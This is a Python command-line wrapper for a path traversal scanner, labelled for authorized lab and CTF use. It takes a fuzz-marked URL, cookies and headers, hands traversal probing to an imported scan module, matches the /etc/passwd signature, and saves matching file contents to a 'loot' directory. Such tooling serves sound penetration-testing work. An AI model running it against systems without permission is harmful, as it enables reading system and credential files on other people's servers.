"""traverse.py — path traversal scanner.

AUTHORIZED USE ONLY. Run this only against systems you own or are explicitly
permitted to test (PortSwigger/THM/HTB labs, CTFs, your own rigs).
"""
import argparse
import sys
from pathlib import Path

import requests

from scanner import scan, load_targets

BANNER = "traverse.py — path traversal scanner | AUTHORIZED TARGETS ONLY"


def build_parser():
    p = argparse.ArgumentParser(
        description=BANNER,
        epilog="Use only against systems you are authorized to test.")
    mode = p.add_mutually_exclusive_group(required=True)
    mode.add_argument("-u", "--url", help="Target URL with a FUZZ marker, e.g. ?filename=FUZZ")
    mode.add_argument("-a", "--auto", help="Auto-discover mode: crawl URL for file-ish params (demo)")
    p.add_argument("--param", help="Parameter to inject into (appends =FUZZ if URL has no marker)")
    p.add_argument("--target-file", help="Specific file to read (default: built-in library)")
    p.add_argument("--os", choices=["linux", "windows", "both"], default="both")
    p.add_argument("--depth", type=int, default=8)
    p.add_argument("--cookie", help="Cookie header, e.g. 'session=abc123'")
    p.add_argument("--header", action="append", default=[], help="Extra header 'Name: value' (repeatable)")
    p.add_argument("--delay", type=float, default=0.3)
    p.add_argument("--all", action="store_true", help="Don't stop at first HIGH hit")
    p.add_argument("--loot-dir", default="./loot")
    p.add_argument("-v", "--verbose", action="store_true")
    return p


def build_session(cookie, headers):
    s = requests.Session()
    s.headers.update({"User-Agent": "traverse.py (authorized testing)"})
    if cookie and "=" in cookie:
        name, _, value = cookie.partition("=")
        s.cookies.set(name.strip(), value.strip())
    for h in headers or []:
        if ":" in h:
            name, _, value = h.partition(":")
            s.headers[name.strip()] = value.strip()
    return s


def _normalize_url(url, param):
    if "FUZZ" in url:
        return url
    if param:
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}{param}=FUZZ"
    raise SystemExit("[!] URL has no FUZZ marker and no --param given.")


def _save_loot(loot_dir, target, snippet):
    d = Path(loot_dir)
    d.mkdir(parents=True, exist_ok=True)
    safe = target.strip("/").replace("/", "_")
    (d / f"{safe}.txt").write_text(snippet, encoding="utf-8")


def main(argv=None):
    args = build_parser().parse_args(argv)
    print(BANNER)
    if args.auto:
        from discover import auto_discover
        return auto_discover(args)
    url = _normalize_url(args.url, args.param)
    session = build_session(args.cookie, args.header)
    targets = load_targets("targets.json", args.os)
    if args.target_file:
        targets = [{"path": args.target_file, "os": args.os, "signature": "root:[x*]:0:0:", "note": "user-specified"}]
    hits = scan(session, url, depth=args.depth, delay=args.delay,
                stop_on_first=not args.all, os_filter=args.os, targets=targets)
    if not hits:
        print("[-] No traversal confirmed.")
        return 1
    for h in hits:
        print(f"\n[+] {h['confidence']} — {h['target']}")
        print(f"    payload: {h['payload']}")
        print(f"    snippet: {h['snippet'][:120].strip()}")
        _save_loot(args.loot_dir, h["target"], h["snippet"])
    print(f"\n[+] {len(hits)} hit(s). Loot saved to {args.loot_dir}/")
    return 0


if __name__ == "__main__":
    sys.exit(main())
